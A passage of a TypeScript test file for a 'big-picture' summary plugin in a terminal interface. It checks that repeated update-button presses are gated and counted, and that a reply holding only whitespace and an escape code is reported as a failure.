    expect(seen.files.get(PAGE)).toBe(securePage(html(1)));
    expect(seen.orca.filter((c) => c.startsWith("tab create"))).toEqual([]);

    const ui = await $.ui.mount({ plugin: "big-picture", surface: "terminal", ...BAND });
    expect((await ui.find({ key: "big-picture-update" }))?.text).toBe("update");
    let release = () => {};
    seen.gate = new Promise<void>((g) => (release = g));
    await ui.press({ key: "big-picture-update" });
    await clock.advance(1);
    expect(seen.writes.length).toBe(2);
    await ui.press({ key: "big-picture-update" });
    await ui.press({ key: "big-picture-update" });
    seen.gate = undefined;
    release();
    await clock.advance(1);
    await ui.unmount();
    expect([seen.asked, seen.writes.length]).toEqual([[], 3]);
    expect(seen.writes[2]!.prompt).toContain(`<previous-summary>\n${html(2)}`);

    // pressed: the work counts as big, so the next turn asks about an update
    await turn($, clock, "tests", 1, "Write");
    expect(seen.asked).toEqual(["update"]);
  });

  test("outside Orca: a reply with nothing in it is a failure", async ($, on) => {
    const { seen, clock } = engine(on, { env: { TERM_PROGRAM: "ghostty" } });
    seen.reply = { isAnswered: true, text: " \x1b[0m \n" };
    await turn($, clock, "x", 1);
    expect((await band($)).texts).toContain("✗ the reply held no summary");
  });
});
